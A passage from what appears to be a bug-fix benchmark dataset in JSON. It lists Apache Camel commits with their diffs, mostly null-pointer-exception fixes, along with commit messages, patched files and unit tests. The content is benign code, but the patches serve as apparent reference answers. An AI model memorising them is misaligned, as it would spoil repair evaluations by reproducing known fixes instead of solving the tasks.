                "patch": "@@ -74,6 +74,14 @@\n      */\n     void addComponent(String componentName, Component component);\n \n+    /**\n+     * Is the given component already registered?\n+     *\n+     * @param componentName the name of the component\n+     * @return the registered Component or <tt>null</tt> if not registered\n+     */\n+    Component hasComponent(String componentName);\n+\n     /**\n      * Gets a component from the context by name.\n      *",
                "raw_url": "https://github.com/apache/camel/raw/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/camel-core/src/main/java/org/apache/camel/CamelContext.java",
                "sha": "7c1f573b1b116402f68a1c00b75b6954c3e17daf",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=dae3690fc209ab3dade190ff9e1e3fdabf73eb87",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -177,6 +177,10 @@ public void setName(String name) {\n         this.name = name;\n     }\n \n+    public Component hasComponent(String componentName) {\n+        return components.get(componentName);\n+    }\n+\n     public void addComponent(String componentName, final Component component) {\n         ObjectHelper.notNull(component, \"component\");\n         synchronized (components) {",
                "raw_url": "https://github.com/apache/camel/raw/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "235849e3437f812487d3bd2abaac48592e56c4e9",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java?ref=dae3690fc209ab3dade190ff9e1e3fdabf73eb87",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java",
                "patch": "@@ -57,7 +57,8 @@\n     private Long delay;\n     private Boolean autoStartup = Boolean.TRUE;\n \n-    public DefaultRouteContext(RouteDefinition route, FromDefinition from, Collection<Route> routes) {\n+    public DefaultRouteContext(CamelContext camelContext, RouteDefinition route, FromDefinition from, Collection<Route> routes) {\n+        this.camelContext = camelContext;\n         this.route = route;\n         this.from = from;\n         this.routes = routes;\n@@ -68,8 +69,8 @@ public DefaultRouteContext(RouteDefinition route, FromDefinition from, Collectio\n      */\n     public DefaultRouteContext(CamelContext camelContext) {\n         this.camelContext = camelContext;\n-        routes = new ArrayList<Route>();\n-        route = new RouteDefinition(\"temporary\");\n+        this.routes = new ArrayList<Route>();\n+        this.route = new RouteDefinition(\"temporary\");\n     }\n \n     public Endpoint getEndpoint() {",
                "raw_url": "https://github.com/apache/camel/raw/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java",
                "sha": "86757f40ec2febd96cb5db4ff2d721b4a4df109a",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/camel-core/src/main/java/org/apache/camel/model/RouteDefinition.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/RouteDefinition.java?ref=dae3690fc209ab3dade190ff9e1e3fdabf73eb87",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/model/RouteDefinition.java",
                "patch": "@@ -417,7 +417,7 @@ protected void setErrorHandlerBuilderIfNull(ErrorHandlerBuilder errorHandlerBuil\n     // Implementation methods\n     // -------------------------------------------------------------------------\n     protected RouteContext addRoutes(Collection<Route> routes, FromDefinition fromType) throws Exception {\n-        RouteContext routeContext = new DefaultRouteContext(this, fromType, routes);\n+        RouteContext routeContext = new DefaultRouteContext(getCamelContext(), this, fromType, routes);\n \n         // configure tracing\n         if (trace != null) {",
                "raw_url": "https://github.com/apache/camel/raw/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/camel-core/src/main/java/org/apache/camel/model/RouteDefinition.java",
                "sha": "87f93f9188bd091c6d43c4a4a14e2280b2d4c905",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/components/camel-spring-javaconfig/src/main/java/org/apache/camel/spring/javaconfig/CamelConfiguration.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-spring-javaconfig/src/main/java/org/apache/camel/spring/javaconfig/CamelConfiguration.java?ref=dae3690fc209ab3dade190ff9e1e3fdabf73eb87",
                "deletions": 1,
                "filename": "components/camel-spring-javaconfig/src/main/java/org/apache/camel/spring/javaconfig/CamelConfiguration.java",
                "patch": "@@ -52,7 +52,7 @@ public CamelBeanPostProcessor camelBeanPostProcessor() throws Exception {\n      */\n     @Bean\n     public CamelContext camelContext() throws Exception {\n-        SpringCamelContext camelContext = new SpringCamelContext();        \n+        SpringCamelContext camelContext = new SpringCamelContext(getApplicationContext());\n         setupCamelContext(camelContext);\n         List<RouteBuilder> routes = routes();\n         for (RoutesBuilder route : routes) {",
                "raw_url": "https://github.com/apache/camel/raw/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/components/camel-spring-javaconfig/src/main/java/org/apache/camel/spring/javaconfig/CamelConfiguration.java",
                "sha": "f6ea4429d16bed2128a2941c0535401692c2aeb3",
                "status": "modified"
            },
            {
                "additions": 86,
                "blob_url": "https://github.com/apache/camel/blob/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/components/camel-spring-javaconfig/src/test/java/org/apache/camel/spring/javaconfig/BeanJavaConfigTest.java",
                "changes": 86,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-spring-javaconfig/src/test/java/org/apache/camel/spring/javaconfig/BeanJavaConfigTest.java?ref=dae3690fc209ab3dade190ff9e1e3fdabf73eb87",
                "deletions": 0,
                "filename": "components/camel-spring-javaconfig/src/test/java/org/apache/camel/spring/javaconfig/BeanJavaConfigTest.java",
                "patch": "@@ -0,0 +1,86 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.spring.javaconfig;\n+\n+import org.apache.camel.EndpointInject;\n+import org.apache.camel.Handler;\n+import org.apache.camel.Produce;\n+import org.apache.camel.ProducerTemplate;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.junit.Test;\n+import org.springframework.config.java.annotation.Bean;\n+import org.springframework.config.java.annotation.Configuration;\n+import org.springframework.config.java.test.JavaConfigContextLoader;\n+import org.springframework.test.annotation.DirtiesContext;\n+import org.springframework.test.context.ContextConfiguration;\n+import org.springframework.test.context.junit4.AbstractJUnit4SpringContextTests;\n+\n+/**\n+ * @version $Revision$\n+ */\n+@ContextConfiguration(\n+        locations = \"org.apache.camel.spring.javaconfig.BeanJavaConfigTest$ContextConfig\",\n+        loader = JavaConfigContextLoader.class\n+)\n+public class BeanJavaConfigTest extends AbstractJUnit4SpringContextTests {\n+\n+    @EndpointInject(uri = \"mock:end\")\n+    protected MockEndpoint endpoint;\n+\n+    @EndpointInject(uri = \"mock:error\")\n+    protected MockEndpoint errorEndpoint;\n+\n+    @Produce(uri = \"direct:start\")\n+    protected ProducerTemplate producer;\n+\n+    @Test\n+    @DirtiesContext\n+    public void testRouteUsingBean() throws Exception {\n+        endpoint.expectedMessageCount(1);\n+        endpoint.message(0).body().isEqualTo(\"Hello World\");\n+        producer.sendBody(\"World\");\n+        endpoint.assertIsSatisfied();\n+    }\n+\n+    public static class SomeBean {\n+\n+        @Handler\n+        public String someMethod(String body) {\n+            return \"Hello \" + body;\n+        }\n+    }\n+\n+    @Configuration\n+    public static class ContextConfig extends SingleRouteCamelConfiguration {\n+\n+        @Bean\n+        @Override\n+        public RouteBuilder route() {\n+            return new RouteBuilder() {\n+                @Override\n+                public void configure() throws Exception {\n+                    from(\"direct:start\")\n+                            .errorHandler(deadLetterChannel(\"mock:end\"))\n+                            .bean(new SomeBean())\n+                            .to(\"mock:end\");\n+                }\n+            };\n+        }\n+    }\n+\n+}\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/components/camel-spring-javaconfig/src/test/java/org/apache/camel/spring/javaconfig/BeanJavaConfigTest.java",
                "sha": "03d45244f1c215d7d124f50f9a25e305928ba8fd",
                "status": "added"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/components/camel-spring/src/main/java/org/apache/camel/spring/SpringCamelContext.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-spring/src/main/java/org/apache/camel/spring/SpringCamelContext.java?ref=dae3690fc209ab3dade190ff9e1e3fdabf73eb87",
                "deletions": 1,
                "filename": "components/camel-spring/src/main/java/org/apache/camel/spring/SpringCamelContext.java",
                "patch": "@@ -140,7 +140,10 @@ public void setApplicationContext(ApplicationContext applicationContext) throws\n         this.applicationContext = applicationContext;\n \n         if (applicationContext instanceof ConfigurableApplicationContext) {\n-            addComponent(\"spring-event\", new EventComponent(applicationContext));\n+            // only add if not already added\n+            if (hasComponent(\"spring-event\") == null) {\n+                addComponent(\"spring-event\", new EventComponent(applicationContext));\n+            }\n         }\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/components/camel-spring/src/main/java/org/apache/camel/spring/SpringCamelContext.java",
                "sha": "ca4bc2e01610cc4db8ea43f426871a72edef1029",
                "status": "modified"
            }
        ],
        "message": "CAMEL-2027: Fixed NPE when using spring java config.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@816992 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/edf150317d46dfb0c2b925617186c075e9db8677",
        "patched_files": [
            "RouteDefinition.java",
            "DefaultRouteContext.java",
            "CamelConfiguration.java",
            "DefaultCamelContext.java",
            "SpringCamelContext.java",
            "CamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java",
            "CamelContextTest.java",
            "BeanJavaConfigTest.java"
        ]
    },
    "camel_db4fe91": {
        "bug_id": "camel_db4fe91",
        "commit": "https://github.com/apache/camel/commit/db4fe9124d83dfa73ae20cdde8aa7c58ebcee7ea",
        "file": [
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/db4fe9124d83dfa73ae20cdde8aa7c58ebcee7ea/camel-core/src/main/java/org/apache/camel/processor/interceptor/TraceInterceptor.java",
                "changes": 12,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/interceptor/TraceInterceptor.java?ref=db4fe9124d83dfa73ae20cdde8aa7c58ebcee7ea",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/interceptor/TraceInterceptor.java",
                "patch": "@@ -201,7 +201,9 @@ private void traceOnCompletion(TracedRouteNodes traced, Exchange exchange) {\n     }\n \n     private void traceOnException(TracedRouteNodes traced, Exchange exchange) throws Exception {\n-        traced.addTraced(new DefaultRouteNode(traced.getLastNode().getProcessorDefinition(), traced.getLastNode().getProcessor()));\n+        if (traced.getLastNode() != null) {\n+            traced.addTraced(new DefaultRouteNode(traced.getLastNode().getProcessorDefinition(), traced.getLastNode().getProcessor()));\n+        }\n         traced.addTraced(new OnExceptionRouteNode());\n         // log and trace so we have the from -> onException event as well\n         logExchange(exchange);\n@@ -210,7 +212,9 @@ private void traceOnException(TracedRouteNodes traced, Exchange exchange) throws\n     }\n \n     private void traceDoCatch(TracedRouteNodes traced, Exchange exchange) throws Exception {\n-        traced.addTraced(new DefaultRouteNode(traced.getLastNode().getProcessorDefinition(), traced.getLastNode().getProcessor()));\n+        if (traced.getLastNode() != null) {\n+            traced.addTraced(new DefaultRouteNode(traced.getLastNode().getProcessorDefinition(), traced.getLastNode().getProcessor()));\n+        }\n         traced.addTraced(new DoCatchRouteNode());\n         // log and trace so we have the from -> doCatch event as well\n         logExchange(exchange);\n@@ -219,7 +223,9 @@ private void traceDoCatch(TracedRouteNodes traced, Exchange exchange) throws Exc\n     }\n \n     private void traceDoFinally(TracedRouteNodes traced, Exchange exchange) throws Exception {\n-        traced.addTraced(new DefaultRouteNode(traced.getLastNode().getProcessorDefinition(), traced.getLastNode().getProcessor()));\n+        if (traced.getLastNode() != null) {\n+            traced.addTraced(new DefaultRouteNode(traced.getLastNode().getProcessorDefinition(), traced.getLastNode().getProcessor()));\n+        }\n         traced.addTraced(new DoFinallyRouteNode());\n         // log and trace so we have the from -> doFinally event as well\n         logExchange(exchange);",
                "raw_url": "https://github.com/apache/camel/raw/db4fe9124d83dfa73ae20cdde8aa7c58ebcee7ea/camel-core/src/main/java/org/apache/camel/processor/interceptor/TraceInterceptor.java",
                "sha": "e7d109768fe8b534d8c58bd61a34205da9e7616c",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE in tracer.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1029319 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/cf2fea4b3ccff7cd4c94bb1e083549be69ca243f",
        "patched_files": [
            "TraceInterceptor.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "TraceInterceptorTest.java"
        ]
    },
    "camel_dc1696e": {
        "bug_id": "camel_dc1696e",
        "commit": "https://github.com/apache/camel/commit/dc1696e89c2a8475f20e52c4e3a5f9c6c977f43a",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/dc1696e89c2a8475f20e52c4e3a5f9c6c977f43a/camel-core/src/main/java/org/apache/camel/processor/ChoiceProcessor.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/ChoiceProcessor.java?ref=dc1696e89c2a8475f20e52c4e3a5f9c6c977f43a",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/ChoiceProcessor.java",
                "patch": "@@ -45,7 +45,9 @@ public void process(Exchange exchange) throws Exception {\n         for (FilterProcessor filterProcessor : filters) {\n             Predicate<Exchange> predicate = filterProcessor.getPredicate();\n             if (predicate != null && predicate.matches(exchange)) {\n-                filterProcessor.getProcessor().process(exchange);\n+                // process next will also take care (has not null test) if next was a stop()\n+                // and this not a processor if so there is no processer to execute\n+                filterProcessor.processNext(exchange);\n                 return;\n             }\n         }",
                "raw_url": "https://github.com/apache/camel/raw/dc1696e89c2a8475f20e52c4e3a5f9c6c977f43a/camel-core/src/main/java/org/apache/camel/processor/ChoiceProcessor.java",
                "sha": "f55e3ed6bdae75d570bb79006aef95482da3b1d2",
                "status": "modified"
            },
            {
                "additions": 149,
                "blob_url": "https://github.com/apache/camel/blob/dc1696e89c2a8475f20e52c4e3a5f9c6c977f43a/camel-core/src/test/java/org/apache/camel/issues/InterceptorPredicateProceedAndStopTest.java",
                "changes": 149,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/issues/InterceptorPredicateProceedAndStopTest.java?ref=dc1696e89c2a8475f20e52c4e3a5f9c6c977f43a",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/issues/InterceptorPredicateProceedAndStopTest.java",
                "patch": "@@ -0,0 +1,149 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.issues;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+\n+/**\n+ * Testing http://activemq.apache.org/camel/dsl.html\n+ */\n+public class InterceptorPredicateProceedAndStopTest extends ContextTestSupport {\n+\n+    public void testInterceptorNoPredicate() throws Exception {\n+        context.addRoutes(new RouteBuilder() {\n+            public void configure() throws Exception {\n+                intercept().to(\"mock:test\");\n+                from(\"seda:order\").to(\"mock:ok\");\n+            }\n+        });\n+\n+        MockEndpoint mockTest = getMockEndpoint(\"mock:test\");\n+        mockTest.expectedBodiesReceived(\"Camel in Action\");\n+\n+        MockEndpoint mockOk = getMockEndpoint(\"mock:ok\");\n+        mockOk.expectedBodiesReceived(\"Camel in Action\");\n+\n+        template.sendBodyAndHeader(\"seda:order\", \"Camel in Action\", \"user\", \"test\");\n+\n+        mockTest.assertIsSatisfied();\n+        mockOk.assertIsSatisfied();\n+    }\n+\n+    public void testInterceptorNoPredicateAndProceed() throws Exception {\n+        context.addRoutes(new RouteBuilder() {\n+            public void configure() throws Exception {\n+                intercept().to(\"mock:test\").proceed();\n+                from(\"seda:order\").to(\"mock:ok\");\n+            }\n+        });\n+\n+        MockEndpoint mockTest = getMockEndpoint(\"mock:test\");\n+        mockTest.expectedBodiesReceived(\"Camel in Action\");\n+\n+        MockEndpoint mockOk = getMockEndpoint(\"mock:ok\");\n+        mockOk.expectedBodiesReceived(\"Camel in Action\");\n+\n+        template.sendBodyAndHeader(\"seda:order\", \"Camel in Action\", \"user\", \"test\");\n+\n+        mockTest.assertIsSatisfied();\n+        mockOk.assertIsSatisfied();\n+    }\n+\n+    public void testInterceptorNoPredicateAndStop() throws Exception {\n+        context.addRoutes(new RouteBuilder() {\n+            public void configure() throws Exception {\n+                intercept().to(\"mock:test\").stop();\n+                from(\"seda:order\").to(\"mock:ok\");\n+            }\n+        });\n+\n+        MockEndpoint mockTest = getMockEndpoint(\"mock:test\");\n+        mockTest.expectedBodiesReceived(\"Camel in Action\");\n+\n+        MockEndpoint mockOk = getMockEndpoint(\"mock:ok\");\n+        mockOk.expectedMessageCount(0);\n+\n+        template.sendBodyAndHeader(\"seda:order\", \"Camel in Action\", \"user\", \"test\");\n+\n+        mockTest.assertIsSatisfied();\n+        mockOk.assertIsSatisfied();\n+    }\n+\n+    public void testInterceptorWithPredicate() throws Exception {\n+        context.addRoutes(new RouteBuilder() {\n+            public void configure() throws Exception {\n+                intercept(header(\"user\").isEqualTo(\"test\")).to(\"mock:test\");\n+                from(\"seda:order\").to(\"mock:ok\");\n+            }\n+        });\n+\n+        MockEndpoint mockTest = getMockEndpoint(\"mock:test\");\n+        mockTest.expectedBodiesReceived(\"Camel in Action\");\n+\n+        MockEndpoint mockOk = getMockEndpoint(\"mock:ok\");\n+        mockOk.expectedBodiesReceived(\"Camel in Action\");\n+\n+        template.sendBodyAndHeader(\"seda:order\", \"Camel in Action\", \"user\", \"test\");\n+\n+        mockTest.assertIsSatisfied();\n+        // TODO: Fix me in CAMEL-676 and the mockOk assertion should pass\n+        //mockOk.assertIsSatisfied();\n+    }\n+\n+    public void testInterceptorWithPredicateAndProceed() throws Exception {\n+        context.addRoutes(new RouteBuilder() {\n+            public void configure() throws Exception {\n+                intercept(header(\"user\").isEqualTo(\"test\")).to(\"mock:test\").proceed();\n+                from(\"seda:order\").to(\"mock:ok\");\n+            }\n+        });\n+\n+        MockEndpoint mockTest = getMockEndpoint(\"mock:test\");\n+        mockTest.expectedBodiesReceived(\"Camel in Action\");\n+\n+        MockEndpoint mockOk = getMockEndpoint(\"mock:ok\");\n+        mockOk.expectedBodiesReceived(\"Camel in Action\");\n+\n+        template.sendBodyAndHeader(\"seda:order\", \"Camel in Action\", \"user\", \"test\");\n+\n+        mockTest.assertIsSatisfied();\n+        mockOk.assertIsSatisfied();\n+    }\n+\n+    public void testInterceptorWithPredicateAndStop() throws Exception {\n+        context.addRoutes(new RouteBuilder() {\n+            public void configure() throws Exception {\n+                intercept(header(\"user\").isEqualTo(\"test\")).to(\"mock:test\").stop();\n+                from(\"seda:order\").to(\"mock:ok\");\n+            }\n+        });\n+\n+        MockEndpoint mockTest = getMockEndpoint(\"mock:test\");\n+        mockTest.expectedBodiesReceived(\"Camel in Action\");\n+\n+        MockEndpoint mockOk = getMockEndpoint(\"mock:ok\");\n+        mockOk.expectedMessageCount(0);\n+\n+        template.sendBodyAndHeader(\"seda:order\", \"Camel in Action\", \"user\", \"test\");\n+\n+        mockTest.assertIsSatisfied();\n+        mockOk.assertIsSatisfied();\n+    }\n+\n+}\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/dc1696e89c2a8475f20e52c4e3a5f9c6c977f43a/camel-core/src/test/java/org/apache/camel/issues/InterceptorPredicateProceedAndStopTest.java",
                "sha": "a14c096c00f656578523052e9048a38de9f9d9e9",
                "status": "added"
            }
        ],
        "message": "CAMEL-675: Avoid NPE for interceptors using predicate and stop(). Added more unit tests, and one of them is still failing - see CAMEL-676\n\ngit-svn-id: https://svn.apache.org/repos/asf/activemq/camel/trunk@674277 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/c1051ffab199b9b26d66cc05d3ea2eeb57beeb5a",
        "patched_files": [
            "ChoiceProcessor.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "InterceptorPredicateProceedAndStopTest.java"
        ]
    },
    "camel_ddc94d1": {
        "bug_id": "camel_ddc94d1",
        "commit": "https://github.com/apache/camel/commit/ddc94d10393265c1ec9cd6dbfebe883c6c75f8c9",
        "file": [
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/ddc94d10393265c1ec9cd6dbfebe883c6c75f8c9/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/DefaultCxfRsBinding.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/DefaultCxfRsBinding.java?ref=ddc94d10393265c1ec9cd6dbfebe883c6c75f8c9",
                "deletions": 2,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/DefaultCxfRsBinding.java",
                "patch": "@@ -40,6 +40,7 @@\n import org.apache.camel.spi.HeaderFilterStrategy;\n import org.apache.camel.spi.HeaderFilterStrategyAware;\n import org.apache.camel.util.ExchangeHelper;\n+import org.apache.camel.util.ObjectHelper;\n import org.apache.cxf.helpers.CastUtils;\n import org.apache.cxf.helpers.HttpHeaderHelper;\n import org.apache.cxf.jaxrs.impl.MetadataMap;\n@@ -92,8 +93,10 @@ public Object populateCxfRsResponseFromExchange(Exchange camelExchange,\n             \n             if (response.getHeader(org.apache.cxf.message.Message.PROTOCOL_HEADERS) != null) {\n                 Map<String, Object> headers = CastUtils.cast((Map<?, ?>)response.getHeader(org.apache.cxf.message.Message.PROTOCOL_HEADERS));\n-                cxfExchange.getOutMessage().putIfAbsent(org.apache.cxf.message.Message.PROTOCOL_HEADERS, \n+                if (!ObjectHelper.isEmpty(cxfExchange) && !ObjectHelper.isEmpty(cxfExchange.getOutMessage())) {\n+                    cxfExchange.getOutMessage().putIfAbsent(org.apache.cxf.message.Message.PROTOCOL_HEADERS, \n                                                         new TreeMap<>(String.CASE_INSENSITIVE_ORDER));\n+                }\n                 final Map<String, List<String>> cxfHeaders =\n                     CastUtils.cast((Map<?, ?>) cxfExchange.getOutMessage().get(org.apache.cxf.message.Message.PROTOCOL_HEADERS));\n                 \n@@ -113,8 +116,10 @@ public Object populateCxfRsResponseFromExchange(Exchange camelExchange,\n                 cxfExchange.put(org.apache.cxf.message.Message.RESPONSE_CODE, response.getHeader(Exchange.HTTP_RESPONSE_CODE, Integer.class));\n             }\n             if (response.getHeader(Exchange.CONTENT_TYPE) != null) {\n-                cxfExchange.getOutMessage().putIfAbsent(org.apache.cxf.message.Message.PROTOCOL_HEADERS, \n+                if (!ObjectHelper.isEmpty(cxfExchange) && !ObjectHelper.isEmpty(cxfExchange.getOutMessage())) {\n+                    cxfExchange.getOutMessage().putIfAbsent(org.apache.cxf.message.Message.PROTOCOL_HEADERS, \n                                                         new TreeMap<>(String.CASE_INSENSITIVE_ORDER));\n+                }\n                 final Map<String, List<String>> cxfHeaders =\n                     CastUtils.cast((Map<?, ?>) cxfExchange.getOutMessage().get(org.apache.cxf.message.Message.PROTOCOL_HEADERS));\n ",
                "raw_url": "https://github.com/apache/camel/raw/ddc94d10393265c1ec9cd6dbfebe883c6c75f8c9/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/DefaultCxfRsBinding.java",
                "sha": "1ae15e91fe33aa268b2855aca047ff182984a13b",
                "status": "modified"
            }
        ],
        "message": "CAMEL-12575:NPE on GET request with Content-Type header",
        "parent": "https://github.com/apache/camel/commit/ad2b04de7d013d20738f3d9c765685bcd108f67d",
        "patched_files": [
            "DefaultCxfRsBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCxfRsBindingTest.java"
        ]
    },
    "camel_de13f93": {
        "bug_id": "camel_de13f93",
        "commit": "https://github.com/apache/camel/commit/de13f934ecb300a93d3fc311fbb2f1de50343400",
        "file": [
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/de13f934ecb300a93d3fc311fbb2f1de50343400/camel-core/src/main/java/org/apache/camel/impl/DefaultProducerTemplate.java",
                "changes": 12,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultProducerTemplate.java?ref=de13f934ecb300a93d3fc311fbb2f1de50343400",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultProducerTemplate.java",
                "patch": "@@ -233,8 +233,10 @@ public void sendBodyAndHeaders(Endpoint endpoint, final Object body, final Map<S\n         Exchange result = send(endpoint, new Processor() {\n             public void process(Exchange exchange) {\n                 Message in = exchange.getIn();\n-                for (Map.Entry<String, Object> header : headers.entrySet()) {\n-                    in.setHeader(header.getKey(), header.getValue());\n+                if (headers != null) {\n+                    for (Map.Entry<String, Object> header : headers.entrySet()) {\n+                        in.setHeader(header.getKey(), header.getValue());\n+                    }\n                 }\n                 in.setBody(body);\n             }\n@@ -251,8 +253,10 @@ public Object sendBodyAndHeaders(Endpoint endpoint, ExchangePattern pattern, fin\n         Exchange exchange = send(endpoint, pattern, new Processor() {\n             public void process(Exchange exchange) throws Exception {\n                 Message in = exchange.getIn();\n-                for (Map.Entry<String, Object> header : headers.entrySet()) {\n-                    in.setHeader(header.getKey(), header.getValue());\n+                if (headers != null) {\n+                    for (Map.Entry<String, Object> header : headers.entrySet()) {\n+                        in.setHeader(header.getKey(), header.getValue());\n+                    }\n                 }\n                 in.setBody(body);\n             }",
                "raw_url": "https://github.com/apache/camel/raw/de13f934ecb300a93d3fc311fbb2f1de50343400/camel-core/src/main/java/org/apache/camel/impl/DefaultProducerTemplate.java",
                "sha": "6a7cfd46449f60c82b24076d17ead27c6553cc33",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/de13f934ecb300a93d3fc311fbb2f1de50343400/camel-core/src/test/java/org/apache/camel/impl/DefaultProducerTemplateTest.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/impl/DefaultProducerTemplateTest.java?ref=de13f934ecb300a93d3fc311fbb2f1de50343400",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/impl/DefaultProducerTemplateTest.java",
                "patch": "@@ -198,6 +198,9 @@ public void testRequestUsingDefaultEndpoint() throws Exception {\n         out = producer.requestBodyAndHeaders(\"Hello\", headers);\n         assertEquals(\"Bye Bye World\", out);\n \n+        out = producer.requestBodyAndHeaders(\"Hello\", null);\n+        assertEquals(\"Bye Bye World\", out);\n+\n         producer.stop();\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/de13f934ecb300a93d3fc311fbb2f1de50343400/camel-core/src/test/java/org/apache/camel/impl/DefaultProducerTemplateTest.java",
                "sha": "8e5942b4f766165f7684ee8be8ebc18ca2e60628",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7589: fix NPE",
        "parent": "https://github.com/apache/camel/commit/fc4cbdbe70b319da272ed341702ce96e78eb9401",
        "patched_files": [
            "DefaultProducerTemplate.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultProducerTemplateTest.java"
        ]
    },
    "camel_deb61d4": {
        "bug_id": "camel_deb61d4",
        "commit": "https://github.com/apache/camel/commit/deb61d414c0032dd2f6f9eac27b1861374c8398f",
        "file": [
            {
                "additions": 17,
